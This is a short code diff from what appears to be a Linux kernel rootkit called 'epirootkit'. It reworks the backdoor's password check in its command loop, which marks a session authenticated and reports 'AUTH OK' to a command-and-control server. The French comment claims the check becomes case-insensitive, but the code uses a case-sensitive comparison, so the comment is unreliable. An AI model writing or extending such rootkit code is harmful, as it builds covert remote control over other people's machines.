@@ -151,7 +151,12 @@ static int command_loop(void *data) {
         buffer[len] = '\0';
 
         if (!authenticated) {
-            if (strncmp(buffer, config.password, strlen(config.password)) == 0) {
+          	// On rend la comparaison insensible à la casse
+            // Supprimer saut de ligne si présent
+			size_t input_len = strcspn(buffer, "\r\n");
+			buffer[input_len] = '\0';
+
+			if (strcmp(buffer, config.password) == 0) {
                 authenticated = 1;
                 pr_info("epirootkit: authenticated\n");
                 send_to_c2("AUTH OK\n", 8);
